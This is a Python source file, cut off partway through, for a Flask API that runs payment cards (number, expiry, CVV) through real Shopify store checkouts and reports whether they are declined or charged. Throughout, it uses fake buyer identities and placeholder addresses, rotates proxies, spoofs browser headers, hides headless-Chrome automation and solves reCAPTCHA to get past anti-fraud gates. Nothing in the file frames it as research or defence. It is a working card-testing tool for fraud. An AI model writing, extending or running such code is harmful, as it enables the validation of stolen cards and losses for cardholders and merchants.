# shopify_captcha_api.py
# ─────────────────────────────────────────────────────────────────────
# Shopify card-check API with real CAPTCHA_REQUIRED solving.
#
# Full flow:
#   1. aiohttp checkout   (cart → checkout → proposal → delivery → submit)
#   2. on CAPTCHA_REQUIRED → headless Chrome against the checkout URL
#      → recaptcha_solver → g-recaptcha-response token
#   3. retry the failed step with checkpointData=token
#   4. poll for receipt (ORDER_PLACED / DECLINED / OTP_REQUIRED)
#
# Run:
#   export NOCAPTCHA_API_KEY=your_key_here
#   python shopify_captcha_api.py       (default port 5000, override PORT=)
#
# Endpoints:
#   GET /shopify?site=<url>&cc=<num|mm|yyyy|cvv>[&proxy=...][&variant=...]
#   GET /captcha/status
#
# Response:
#   {"Gateway": str, "Price": float, "Response": str,
#    "Status": bool, "cc": str, "CaptchaSolved": bool}
# ─────────────────────────────────────────────────────────────────────

import asyncio
import aiohttp
import json
import os
import random
import re
import logging
import traceback
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse

from flask import Flask, request, jsonify

# ── logging ─────────────────────────────────────────────────────────
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%H:%M:%S",
)
log = logging.getLogger("shopify-captcha")

# ── GraphQL documents (kept in a separate file to keep this readable) ──
try:
    from _gql_docs import (
        QUERY_PROPOSAL_SHIPPING,
        QUERY_PROPOSAL_DELIVERY,
        MUTATION_SUBMIT,
        QUERY_POLL,
    )
except Exception as _e:
    raise SystemExit(
        f"missing _gql_docs.py — copy the three GraphQL strings from your "
        f"existing api.py into _gql_docs.py  (import error: {_e})"
    )

# ── optional captcha solver ─────────────────────────────────────────
_SOLVER_AVAILABLE = False
_SOLVER_IMPORT_ERR = None
try:
    from recaptcha_solver import RecaptchaSolver, Settings as SolverSettings
    _SOLVER_AVAILABLE = True
except Exception as e:
    _SOLVER_IMPORT_ERR = str(e)

_captcha_pool = ThreadPoolExecutor(max_workers=2, thread_name_prefix="cap")

NOCAPTCHA_API_KEY = os.environ.get("NOCAPTCHA_API_KEY", "")
CAPTCHA_ENABLED   = bool(NOCAPTCHA_API_KEY)
CHROME_BINARY     = os.environ.get("CHROME_BINARY", "")
CHROMEDRIVER_PATH = os.environ.get("CHROMEDRIVER_PATH", "")
CAPTCHA_TIMEOUT   = int(os.environ.get("CAPTCHA_TIMEOUT", "120"))


# ═══════════════════════════════════════════════════════════════════
# Address book
# ═══════════════════════════════════════════════════════════════════

C2C = {"USD": "US", "CAD": "CA", "INR": "IN",
       "AED": "AE", "HKD": "HK", "GBP": "GB", "CHF": "CH"}

book = {
    "US": {"address1": "123 Main", "city": "NY", "postalCode": "10080",
           "zoneCode": "NY", "countryCode": "US", "phone": "2194157586"},
    "CA": {"address1": "88 Queen", "city": "Toronto", "postalCode": "M5J2J3",
           "zoneCode": "ON", "countryCode": "CA", "phone": "4165550198"},
    "GB": {"address1": "221B Baker Street", "city": "London",
           "postalCode": "NW1 6XE", "zoneCode": "LND", "countryCode": "GB",
           "phone": "2079460123"},
    "IN": {"address1": "221B MG", "city": "Mumbai", "postalCode": "400001",
           "zoneCode": "MH", "countryCode": "IN", "phone": "+91 9876543210"},
    "AE": {"address1": "Burj Tower", "city": "Dubai", "postalCode": "",
           "zoneCode": "DU", "countryCode": "AE", "phone": "+971 50 123 4567"},
    "HK": {"address1": "Nathan 88", "city": "Kowloon", "postalCode": "",
           "zoneCode": "KL", "countryCode": "HK", "phone": "+852 5555 5555"},
    "CN": {"address1": "8 Zhongguancun Street", "city": "Beijing",
           "postalCode": "100080", "zoneCode": "BJ", "countryCode": "CN",
           "phone": "1062512345"},
    "CH": {"address1": "Gotthardstrasse 17", "city": "Schweiz",
           "postalCode": "6430", "zoneCode": "SZ", "countryCode": "CH",
           "phone": "445512345"},
    "AU": {"address1": "1 Martin Place", "city": "Sydney", "postalCode": "2000",
           "zoneCode": "NSW", "countryCode": "AU", "phone": "291234567"},
    "DEFAULT": {"address1": "123 Main", "city": "New York",
                "postalCode": "10080", "zoneCode": "NY",
                "countryCode": "US", "phone": "2194157586"},
}


def pick_addr(url, cc=None, rc=None):
    cc = (cc or "").upper(); rc = (rc or "").upper()
    dom = urlparse(url).netloc
    tcn = dom.split(".")[-1].upper()
    if tcn in book:
        return book[tcn]
    ccn = C2C.get(cc)
    if rc in book and ccn == rc:
        return book[rc]
    if rc in book:
        return book[rc]
    return book["DEFAULT"]


def extract_between(text, start, end):
    if not text or not start or not end:
        return None
    try:
        if start in text:
            parts = text.split(start, 1)
            if len(parts) > 1 and end in parts[1]:
                r = parts[1].split(end, 1)[0]
                return r if r else None
    except Exception:
        pass
    return None


class Utils:
    @staticmethod
    def get_random_name():
        first = ["James", "John", "Robert", "Michael", "William", "David",
                 "Mary", "Patricia", "Jennifer", "Linda"]
        last = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia",
                "Miller", "Davis", "Rodriguez"]
        return (random.choice(first), random.choice(last))

    @staticmethod
    def generate_email(first, last):
        domains = ["gmail.com", "yahoo.com", "outlook.com", "protonmail.com"]
        return f"{first.lower()}.{last.lower()}{random.randint(1,99)}@{random.choice(domains)}"


def parse_proxy(proxy_str):
    if not proxy_str:
        return None
    parts = proxy_str.split(":")
    if len(parts) == 2:
        return f"http://{parts[0]}:{parts[1]}"
    if len(parts) == 4:
        ip, port, user, pw = parts
        return f"http://{user}:{pw}@{ip}:{port}"
    return None


def is_captcha_required(response_text):
    if not response_text:
        return False
    indicators = [
        "CAPTCHA_REQUIRED",
        '"code":"CAPTCHA_REQUIRED"',
        "'code':'CAPTCHA_REQUIRED'",
        '"message":"CAPTCHA_REQUIRED"',
        "captcha required",
        "CAPTCHA CHALLENGE",
        "hcaptcha",
        "h-captcha",
    ]
    up = response_text.upper()
    return any(i.upper() in up for i in indicators)


# ═══════════════════════════════════════════════════════════════════
# Selenium CAPTCHA solve
# ═══════════════════════════════════════════════════════════════════

def _build_chrome_driver(proxy_url: str = ""):
    """Prefer selenium-wire (auth proxies). Fall back to vanilla selenium."""
    try:
        from seleniumwire import webdriver as sw_webdriver
        options = sw_webdriver.ChromeOptions()
        options.add_argument("--headless=new")
        options.add_argument("--no-sandbox")
        options.add_argument("--disable-dev-shm-usage")
        options.add_argument("--disable-blink-features=AutomationControlled")
        options.add_argument("--window-size=1280,900")
        options.add_argument("--lang=en-US,en")
        if CHROME_BINARY:
            options.binary_location = CHROME_BINARY
        sw_opts = {}
        if proxy_url:
            sw_opts["proxy"] = {
                "http": proxy_url,
                "https": proxy_url,
                "no_proxy": "localhost,127.0.0.1",
            }
        if CHROMEDRIVER_PATH:
            sw_opts["executable_path"] = CHROMEDRIVER_PATH
        driver = sw_webdriver.Chrome(options=options, seleniumwire_options=sw_opts)
        return driver, "selenium-wire"
    except Exception as e:
        log.debug("selenium-wire unavailable: %s", e)

    from selenium import webdriver as se_webdriver
    options = se_webdriver.ChromeOptions()
    options.add_argument("--headless=new")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--disable-blink-features=AutomationControlled")
    options.add_argument("--window-size=1280,900")
    options.add_argument("--lang=en-US,en")
    if CHROME_BINARY:
        options.binary_location = CHROME_BINARY
    if proxy_url and "://" in proxy_url and "@" not in proxy_url:
        options.add_argument(f"--proxy-server={proxy_url}")
    if CHROMEDRIVER_PATH:
        driver = se_webdriver.Chrome(executable_path=CHROMEDRIVER_PATH, options=options)
    else:
        driver = se_webdriver.Chrome(options=options)
    return driver, "selenium"


def solve_checkout_captcha(checkout_url: str, proxy_url: str = "",
                           timeout: int = CAPTCHA_TIMEOUT) -> str:
    """Open the checkout URL in real Chrome, solve the recaptcha,
    return the g-recaptcha-response token (empty string on failure)."""
    if not _SOLVER_AVAILABLE:
        log.error("solver unavailable: %s", _SOLVER_IMPORT_ERR)
        return ""
    if not CAPTCHA_ENABLED:
        log.error("NOCAPTCHA_API_KEY not set — cannot solve")
        return ""

    driver = None
    try:
        driver, flavor = _build_chrome_driver(proxy_url)
        log.info("selenium up (%s) -> %s", flavor, checkout_url)
        driver.set_page_load_timeout(timeout)
        driver.get(checkout_url)

        settings = SolverSettings(
            captcha_enabled=True,
            recaptcha_enabled=True,
            auto_open=True,
            auto_solve=True,
            api_key=NOCAPTCHA_API_KEY,
        )

        import time as _t
        _t.sleep(3)

        # The recaptcha is rendered inside an iframe. Switch into it,
        # run the solver's frame-level logic, then hop into the bframe
        # if a challenge opens.
        switched = False
        try:
            for f in driver.find_elements("css selector", "iframe"):
                src = (f.get_attribute("src") or "").lower()
                if "recaptcha" in src or "hcaptcha" in src:
                    driver.switch_to.frame(f)
                    switched = True
                    break
        except Exception as e:
            log.debug("iframe scan: %s", e)

        if switched:
            solver = RecaptchaSolver(driver, settings)
            solver.run()
            try:
                driver.switch_to.default_content()
                _t.sleep(1)
                bframes = driver.find_elements(
                    "css selector", "iframe[title*='recaptcha challenge']"
                )
                if bframes:
                    driver.switch_to.frame(bframes[0])
                    solver2 = RecaptchaSolver(driver, settings)
                    solver2.run()
                    driver.switch_to.default_content()
            except Exception as e:
                log.warning("bframe solve: %s", e)
        else:
            try:
                driver.switch_to.default_content()
            except Exception:
                pass
            RecaptchaSolver(driver, settings).run()

        _t.sleep(2)
        try:
            driver.switch_to.default_content()
        except Exception:
            pass

        token = driver.execute_script(
            "return (document.querySelector('textarea[name=\"g-recaptcha-response\"]')||{}).value || "
            "(document.querySelector('input[name=\"g-recaptcha-response\"]')||{}).value || '';"
        ) or ""
        token = token.strip()
        if token:
            log.info("captcha token acquired (len=%d)", len(token))
        else:
            log.warning("no g-recaptcha-response token found")
        return token

    except Exception as e:
        log.error("solve_checkout_captcha failed: %s", e)
        log.debug(traceback.format_exc())
        return ""
    finally:
        if driver:
            try:
                driver.quit()
            except Exception:
                pass


async def solve_captcha_async(checkout_url: str, proxy_url: str = "") -> str:
    loop = asyncio.get_event_loop()
    return await loop.run_in_executor(
        _captcha_pool,
        lambda: solve_checkout_captcha(checkout_url, proxy_url, CAPTCHA_TIMEOUT),
    )


# ═══════════════════════════════════════════════════════════════════
# HTTP helpers
# ═══════════════════════════════════════════════════════════════════

async def make_graphql_request(session, graphql_url, params, headers,
                               json_data, proxy=None):
    try:
        response = await session.post(
            graphql_url, params=params, headers=headers,
            json=json_data, proxy=proxy,
        )
        return response, await response.text()
    except Exception as e:
        return None, str(e)


async def fetch_products(domain, proxy_str=None):
    try:
        if not domain.startswith("http"):
            domain = "https://" + domain
        connector = aiohttp.TCPConnector(ssl=False)
        timeout = aiohttp.ClientTimeout(total=15)
        proxy = parse_proxy(proxy_str) if proxy_str else None

        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            async with session.get(f"{domain}/products.json",
                                   proxy=proxy, timeout=15) as resp:
                if resp.status != 200:
                    return False, f"Site Error! Status: {resp.status}"
                text = await resp.text()
                if "shopify" not in text.lower():
                    return False, "Not Shopify!"
                products = (await resp.json())["products"]
                if not products:
                    return False, "No Products!"

        min_price = float("inf")
        min_product = None
        for product in products:
            for variant in product.get("variants", []):
                if not variant.get("available", True):
                    continue
                try:
                    price = float(str(variant.get("price", "0")).replace(",", ""))
                    if price < min_price:
                        min_price = price
                        min_product = {
                            "site": domain,
                            "price": f"{price:.2f}",
                            "variant_id": str(variant["id"]),
                            "link": f"{domain}/products/{product['handle']}",
                        }
                except (ValueError, TypeError, AttributeError):
                    continue
        if min_product and min_product.get("variant_id"):
            return min_product
        return False, "No Valid Products"
    except aiohttp.ClientError as e:
        return False, f"Proxy Error: {e}"
    except Exception as e:
        return False, f"error: {e}"


def extract_clean_response(message):
    if not message:
        return "UNKNOWN_ERROR"
    message = str(message)
    for pattern in [
        r"(PAYMENTS_[A-Z_]+)",
        r"(CARD_[A-Z_]+)",
        r"([A-Z]+_[A-Z]+_[A-Z_]+)",
        r"([A-Z]+_[A-Z_]+)",
        r'code["\']?\s*[:=]\s*["\']?([^"\',]+)["\']?',
        r'{"code":"([^"]+)"',
        r"'code':'([^']+)'",
    ]:
        for match in re.findall(pattern, message, re.IGNORECASE):
            if isinstance(match, tuple):
                match = match[0]
            if match and "_" in match and len(match) < 50:
                return match.strip("{}:'\" ")
    words = message.split()
    if words and "_" in words[0] and words[0].isupper():
        return words[0]
    return message[:50]


# ═══════════════════════════════════════════════════════════════════
# Checkout flow
# ═══════════════════════════════════════════════════════════════════

async def process_card(cc, mes, ano, cvv, site_url,
                       variant_id=None, proxy_str=None):
    gateway = "UNKNOWN"
    total_price = "0.00"
    currency = "USD"
    ourl = site_url if site_url.startswith("http") else f"https://{site_url}"
    payment_identifier = None
    proxy = parse_proxy(proxy_str) if proxy_str else None
    checkpoint_data = None
    running_total = "0.00"
    captcha_solved = False

    try:
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9",
            "Content-Type": "application/json",
            "Origin": ourl, "Referer": ourl,
            "sec-ch-ua": '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
            "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
        }

        addr = pick_addr(ourl)
        country_code = addr["countryCode"]
        firstName, lastName = Utils.get_random_name()
        email = Utils.generate_email(firstName, lastName)
        phone = addr["phone"]; street = addr["address1"]
        city = addr["city"]; state = addr["zoneCode"]
        s_zip = addr["postalCode"]; address2 = ""

        if not variant_id:
            info = await fetch_products(ourl, proxy_str)
            if isinstance(info, tuple) and info[0] is False:
                return False, info[1], gateway, total_price, currency, captcha_solved
            variant_id = info["variant_id"]

        connector = aiohttp.TCPConnector(ssl=False)
        timeout = aiohttp.ClientTimeout(total=60)

        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            url = ourl
            cart = url + "/cart/add.js"
            checkout = url + "/checkout/"

            cart_headers = {
                **headers,
                "Content-Type": "application/x-www-form-urlencoded",
                "Accept": "application/json, text/javascript",
            }
            cart_resp = await session.post(
                cart, data=f"id={variant_id}&quantity=1",
                headers=cart_headers, proxy=proxy,
            )
            if cart_resp.status != 200:
                cart_headers_alt = {
                    **headers,
                    "Content-Type": "application/json",
                    "Accept": "application/json",
                }
                cart_resp = await session.post(
                    cart,
                    json={"items": [{"id": int(variant_id), "quantity": 1}]},
                    headers=cart_headers_alt, proxy=proxy,
                )
            if cart_resp.status != 200:
                return False, f"Cart failed with status {cart_resp.status}", gateway, total_price, currency, captcha_solved

            checkout_headers = {
                **headers,
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "sec-fetch-dest": "document", "sec-fetch-mode": "navigate",
                "sec-fetch-site": "same-origin", "sec-fetch-user": "?1",
            }
            response = await session.post(
                url=checkout, allow_redirects=True,
                headers=checkout_headers, proxy=proxy,
            )
            checkout_url = str(response.url)

            attempt_match = re.search(r"/checkouts/cn/([^/?]+)", checkout_url)
            attempt_token = (
                attempt_match.group(1) if attempt_match
                else checkout_url.split("/")[-1].split("?")[0]
            )

            sst = (response.headers.get("X-Checkout-One-Session-Token")
                   or response.headers.get("x-checkout-one-session-token"))
            text = await response.text()
            if not sst:
                for a, b in [
                    ('name="serialized-sessionToken" content="&quot;', "&quot;"),
                    ('name="serialized-sessionToken" content="', '"'),
                    ('"serializedSessionToken":"', '"'),
                    ('data-session-token="', '"'),
                    ('"sessionToken":"', '"'),
                ]:
                    sst = extract_between(text, a, b)
                    if sst:
                        break

            if "login" in checkout_url.lower():
                return False, "Site requires login!", gateway, total_price, currency, captcha_solved

            queueToken = (extract_between(text, "queueToken&quot;:&quot;", "&quot;")
                          or extract_between(text, '"queueToken":"', '"'))
            stableId = (extract_between(text, "stableId&quot;:&quot;", "&quot;")
                        or extract_between(text, '"stableId":"', '"'))
            merch = (extract_between(text, "ProductVariantMerchandise/", "&quot;")
                     or extract_between(text, "ProductVariantMerchandise/", "&q")
                     or extract_between(text, '"merchandiseId":"gid://shopify/ProductVariantMerchandise/', '"')
                     or str(variant_id))

            currency = "USD"
            if "currencyCode&quot;:&quot;" in text:
                currency = extract_between(text, "currencyCode&quot;:&quot;", "&quot;") or "USD"
            elif '"currencyCode":"' in text:
                currency = extract_between(text, '"currencyCode":"', '"') or "USD"

            subtotal = (
                extract_between(text, "subtotalBeforeTaxesAndShipping&quot;:{&quot;value&quot;:{&quot;amount&quot;:&quot;", "&quot;")
                or extract_between(text, '"subtotalBeforeTaxesAndShipping":{"value":{"amount":"', '"')
            )
            if not subtotal:
                pm = re.search(r'"price":\s*"([\d.]+)"', text)
                subtotal = pm.group(1) if pm else "0.01"

            unescaped = text.replace("&quot;", '"').replace("&amp;", "&").replace("&#39;", "'")
            build_id = None
            bm = re.search(r'"commitSha"\s*:\s*"([a-f0-9]{40})"', unescaped)
            if bm:
                build_id = bm.group(1)

            source_token = extract_between(text, 'name="serialized-sourceToken" content="', '"')
            if source_token:
                source_token = source_token.replace("&quot;", "").strip('"')

            ident_sig = None
            im = re.search(r'checkoutCardsinkCallerIdentificationSignature":"([^"]+)"', unescaped)
            if im:
                ident_sig = im.group(1)

            if not sst:
                return False, "Failed to get session token", gateway, total_price, currency, captcha_solved

            headers.update({
                "shopify-checkout-client": "checkout-web/1.0",
                "shopify-checkout-source": f'id="{attempt_token}", type="cn"',
                "x-checkout-one-session-token": sst,
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
            })
            if build_id:
                headers["x-checkout-web-build-id"] = build_id
                headers["x-checkout-web-deploy-stage"] = "production"
                headers["x-checkout-web-server-handling"] = "fast"
                headers["x-checkout-web-server-rendering"] = "yes"
            if source_token:
                headers["x-checkout-web-source-id"] = source_token

            graphql_url = f"https://{urlparse(ourl).netloc}/checkouts/unstable/graphql"
            params = {"operationName": "Proposal"}

            # ── Proposal 1 ───────────────────────────────────────────
            json_data = {
                "query": QUERY_PROPOSAL_SHIPPING,
                "variables": {
                    "sessionInput": {"sessionToken": sst},
                    "queueToken": queueToken or "",
                    "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
                    "delivery": {
                        "deliveryLines": [{
                            "destination": {"partialStreetAddress": {
                                "address1": street, "address2": address2,
                                "city": city, "countryCode": country_code,
                                "postalCode": s_zip, "firstName": firstName,
                                "lastName": lastName, "zoneCode": state,
                                "phone": phone,
                            }},
                            "selectedDeliveryStrategy": {
                                "deliveryStrategyMatchingConditions": {
                                    "estimatedTimeInTransit": {"any": True},
                                    "shipments": {"any": True},
                                },
                                "options": {},
                            },
                            "targetMerchandiseLines": {"any": True},
                            "deliveryMethodTypes": ["SHIPPING"],
                            "expectedTotalPrice": {"any": True},
                            "destinationChanged": True,
                        }],
                        "noDeliveryRequired": [],
                        "useProgressiveRates": False,
                        "prefetchShippingRatesStrategy": None,
                        "supportsSplitShipping": True,
                    },
                    "deliveryExpectations": {"deliveryExpectationLines": []},
                    "merchandise": {
                        "merchandiseLines": [{
                            "stableId": stableId or "1",
                            "merchandise": {"productVariantReference": {
                                "id": f"gid://shopify/ProductVariantMerchandise/{merch}",
                                "variantId": f"gid://shopify/ProductVariant/{variant_id}",
                                "properties": [],
                                "sellingPlanId": None,
                                "sellingPlanDigest": None,
                            }},
                            "quantity": {"items": {"value": 1}},
                            "expectedTotalPrice": {"value": {"amount": subtotal, "currencyCode": currency}},
                            "lineComponentsSource": None,
                            "lineComponents": [],
                        }],
                    },
                    "payment": {
                        "totalAmount": {"any": True},
                        "paymentLines": [],
                        "billingAddress": {"streetAddress": {
                            "address1": "", "city": "",
                            "countryCode": country_code,
                            "lastName": "", "zoneCode": "ENG", "phone": "",
                        }},
                    },
                    "buyerIdentity": {
                        "customer": {"presentmentCurrency": currency, "countryCode": country_code},
                        "email": email, "emailChanged": False,
                        "phoneCountryCode": country_code,
                        "marketingConsent": [{"email": {"value": email}}],
                        "shopPayOptInPhone": {"countryCode": country_code},
                        "rememberMe": False,
                    },
                    "tip": {"tipLines": []},
                    "taxes": {
                        "proposedAllocations": None,
                        "proposedTotalAmount": {"value": {"amount": "0", "currencyCode": currency}},
                        "proposedTotalIncludedAmount": None,
                        "proposedMixedStateTotalAmount": None,
                        "proposedExemptions": [],
                    },
                    "note": {"message": None, "customAttributes": []},
                    "localizationExtension": {"fields": []},
                    "nonNegotiableTerms": None,
                    "scriptFingerprint": {
                        "signature": None, "signatureUuid": None,
                        "lineItemScriptChanges": [],
                        "paymentScriptChanges": [],
                        "shippingScriptChanges": [],
                    },
                    "optionalDuties": {"buyerRefusesDuties": False},
                },
                "operationName": "Proposal",
            }

            response, resp_text = await make_graphql_request(
                session, graphql_url, params, headers, json_data, proxy
            )
            if response is None:
                return False, f"Request failed: {resp_text}", gateway, total_price, currency, captcha_solved            # ── captcha gate #1 ──────────────────────────────────────
            if is_captcha_required(resp_text):
                log.info("CAPTCHA_REQUIRED on proposal 1 — solving")
                token = await solve_captcha_async(checkout_url, proxy_str)
                if not token:
                    return False, "CAPTCHA_REQUIRED (solve failed)", gateway, total_price, currency, False
                captcha_solved = True
                checkpoint_data = token
                json_data["variables"]["checkpointData"] = token
                response, resp_text = await make_graphql_request(
                    session, graphql_url, params, headers, json_data, proxy
                )
                if is_captcha_required(resp_text):
                    return False, "CAPTCHA_REQUIRED (retry still blocked)", gateway, total_price, currency, captcha_solved

            try:
                resp_json = json.loads(resp_text)
            except json.JSONDecodeError as e:
                return False, f"Invalid JSON response: {e}", gateway, total_price, currency, captcha_solved

            if "errors" in resp_json:
                msgs = [e.get("message", str(e)) for e in resp_json["errors"][:3]]
                return False, f"GraphQL Error: {'; '.join(msgs)}", gateway, total_price, currency, captcha_solved

            try:
                session_data = resp_json["data"].get("session")
                if session_data is None:
                    return False, "Session is null", gateway, total_price, currency, captcha_solved
                negotiate = session_data.get("negotiate")
                if negotiate is None:
                    return False, "Negotiate returned null", gateway, total_price, currency, captcha_solved
                result = negotiate.get("result")
                if result is None:
                    return False, "Result is null", gateway, total_price, currency, captcha_solved

                result_type = result.get("__typename", "Unknown")
                if result_type == "CheckpointDenied":
                    return False, "Checkpoint Denied", gateway, total_price, currency, captcha_solved
                if result_type == "Throttled":
                    return False, "Throttled", gateway, total_price, currency, captcha_solved
                if result_type == "NegotiationResultFailed":
                    return False, "Negotiation failed", gateway, total_price, currency, captcha_solved

                checkpoint_data = result.get("checkpointData") or checkpoint_data
                seller_proposal = result.get("sellerProposal")
                if seller_proposal is None:
                    return False, "Seller proposal is null", gateway, total_price, currency, captcha_solved

                delivery_data = seller_proposal.get("delivery")
                running_total = seller_proposal["runningTotal"]["value"]["amount"]
            except (KeyError, TypeError) as e:
                return False, f"Failed to parse proposal: {e}", gateway, total_price, currency, captcha_solved

            if not delivery_data:
                return False, "No delivery data", gateway, total_price, currency, captcha_solved

            delivery_type = delivery_data.get("__typename", "")
            delivery_strategy = ""
            shipping_amount = 0.0
            if delivery_type == "FilledDeliveryTerms":
                dls = delivery_data.get("deliveryLines", [{}])
                if dls:
                    strategies = dls[0].get("availableDeliveryStrategies", [])
                    if strategies:
                        delivery_strategy = strategies[0].get("handle", "")
                        try:
                            shipping_amount = float(
                                strategies[0].get("amount", {}).get("value", {}).get("amount", "0")
                            )
                        except Exception:
                            shipping_amount = 0.0

            try:
                td = seller_proposal.get("tax", {})
                tax_amount = (
                    float(td.get("totalTaxAmount", {}).get("value", {}).get("amount", "0"))
                    if td.get("__typename") == "FilledTaxTerms" else 0.0
                )
            except Exception:
                tax_amount = 0.0

            pd = seller_proposal.get("payment", {})
            if pd and pd.get("__typename") == "FilledPaymentTerms":
                for method in pd.get("availablePaymentLines", []):
                    pm = method.get("paymentMethod", {})
                    if pm.get("name") or pm.get("paymentMethodIdentifier"):
                        payment_identifier = pm.get("paymentMethodIdentifier")
                        gateway = pm.get("extensibilityDisplayName") or pm.get("name", "UNKNOWN")
                        total_price = str(float(running_total) + shipping_amount + tax_amount)
                        break

            if not payment_identifier:
                return False, "No valid payment method found", gateway, total_price, currency, captcha_solved

            # ── Delivery proposal ────────────────────────────────────
            json_data["query"] = QUERY_PROPOSAL_DELIVERY
            json_data["variables"]["delivery"]["deliveryLines"][0]["selectedDeliveryStrategy"] = {
                "deliveryStrategyByHandle": {
                    "handle": delivery_strategy,
                    "customDeliveryRate": False,
                },
                "options": {},
            }
            json_data["variables"]["delivery"]["deliveryLines"][0]["targetMerchandiseLines"] = {
                "lines": [{"stableId": stableId or "1"}]
            }
            json_data["variables"]["delivery"]["deliveryLines"][0]["expectedTotalPrice"] = {
                "value": {"amount": str(shipping_amount), "currencyCode": currency}
            }
            json_data["variables"]["delivery"]["deliveryLines"][0]["destinationChanged"] = False
            json_data["variables"]["payment"]["billingAddress"] = {
                "streetAddress": {
                    "address1": street, "address2": address2,
                    "city": city, "countryCode": country_code,
                    "postalCode": s_zip, "firstName": firstName,
                    "lastName": lastName, "zoneCode": state, "phone": phone,
                }
            }
            json_data["variables"]["taxes"]["proposedTotalAmount"]["value"]["amount"] = str(tax_amount)
            json_data["variables"]["buyerIdentity"]["shopPayOptInPhone"]["number"] = phone
            if checkpoint_data:
                json_data["variables"]["checkpointData"] = checkpoint_data

            response, resp_text = await make_graphql_request(
                session, graphql_url, params, headers, json_data, proxy
            )

            # ── captcha gate #2 ──────────────────────────────────────
            if is_captcha_required(resp_text):
                log.info("CAPTCHA_REQUIRED on delivery proposal — solving")
                token = await solve_captcha_async(checkout_url, proxy_str)
                if not token:
                    return False, "CAPTCHA_REQUIRED (solve failed)", gateway, total_price, currency, False
                captcha_solved = True
                json_data["variables"]["checkpointData"] = token
                response, resp_text = await make_graphql_request(
                    session, graphql_url, params, headers, json_data, proxy
                )
                if is_captcha_required(resp_text):
                    return False, "CAPTCHA_REQUIRED (retry still blocked)", gateway, total_price, currency, captcha_solved

            # ── PCI tokenize ────────────────────────────────────────
            payload = {
                "credit_card": {
                    "number": cc,
                    "month": int(mes),
                    "year": int(ano),
                    "verification_value": cvv,
                    "start_month": None,
                    "start_year": None,
                    "issue_number": "",
                    "name": f"{firstName} {lastName}",
                },
                "payment_session_scope": urlparse(url).netloc,
            }
            vault_headers = {
                "Content-Type": "application/json",
                "Accept": "application/json",
                "Accept-Language": "en-US,en;q=0.9",
                "Origin": "https://checkout.pci.shopifyinc.com",
                "Referer": "https://checkout.pci.shopifyinc.com/build/a8e4a94/number-ltr.html?identifier=&locationURL=",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0",
                "sec-ch-ua": '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": '"Windows"',
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "sec-fetch-storage-access": "active",
            }
            if ident_sig:
                vault_headers["shopify-identification-signature"] = ident_sig

            response = await session.post(
                "https://checkout.pci.shopifyinc.com/sessions",
                json=payload, headers=vault_headers, proxy=proxy,
            )
            try:
                token_data = await response.json()
                token = token_data.get("id")
                if not token:
                    return False, "Unable to get payment token", gateway, total_price, currency, captcha_solved
            except Exception as e:
                return False, f"Unable to get payment token: {e}", gateway, total_price, currency, captcha_solved

            # ── Submit ───────────────────────────────────────────────
            params = {"operationName": "SubmitForCompletion"}
            submit_variables = {
                "input": {
                    "sessionInput": {"sessionToken": sst},
                    "queueToken": queueToken or "",
                    "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
                    "delivery": {
                        "deliveryLines": [{
                            "destination": {"streetAddress": {
                                "address1": street, "address2": address2,
                                "city": city, "countryCode": country_code,
                                "postalCode": s_zip, "firstName": firstName,
                                "lastName": lastName, "zoneCode": state, "phone": phone,
                            }},
                            "selectedDeliveryStrategy": {
                                "deliveryStrategyByHandle": {
                                    "handle": delivery_strategy,
                                    "customDeliveryRate": False,
                                },
                                "options": {"phone": phone},
                            },
                            "targetMerchandiseLines": {"lines": [{"stableId": stableId or "1"}]},
                            "deliveryMethodTypes": ["SHIPPING"],
                            "expectedTotalPrice": {
                                "value": {"amount": str(shipping_amount), "currencyCode": currency}
                            },
                            "destinationChanged": False,
                        }],
                        "noDeliveryRequired": [],
                        "useProgressiveRates": True,
                        "prefetchShippingRatesStrategy": None,
                        "supportsSplitShipping": True,
                    },
                    "merchandise": {
                        "merchandiseLines": [{
                            "stableId": stableId or "1",
                            "merchandise": {"productVariantReference": {
                                "id": f"gid://shopify/ProductVariantMerchandise/{merch}",
                                "variantId": f"gid://shopify/ProductVariant/{variant_id}",
                                "properties": [],
                                "sellingPlanId": None,
                                "sellingPlanDigest": None,
                            }},
                            "quantity": {"items": {"value": 1}},
                            "expectedTotalPrice": {"value": {"amount": subtotal, "currencyCode": currency}},
                            "lineComponentsSource": None,
                            "lineComponents": [],
                        }],
                    },
                    "payment": {
                        "totalAmount": {"any": True},
                        "paymentLines": [{
                            "paymentMethod": {"directPaymentMethod": {
                                "paymentMethodIdentifier": payment_identifier,
                                "sessionId": token,
                                "billingAddress": {"streetAddress": {
                                    "address1": street, "address2": address2,
                                    "city": city, "countryCode": country_code,
                                    "postalCode": s_zip, "firstName": firstName,
                                    "lastName": lastName, "zoneCode": state, "phone": phone,
                                }},
                                "cardSource": None,
                            }},
                            "amount": {"value": {"amount": running_total, "currencyCode": currency}},
                            "dueAt": None,
                        }],
                        "billingAddress": {"streetAddress": {
                            "address1": street, "address2": address2,
                            "city": city, "countryCode": country_code,
                            "postalCode": s_zip, "firstName": firstName,
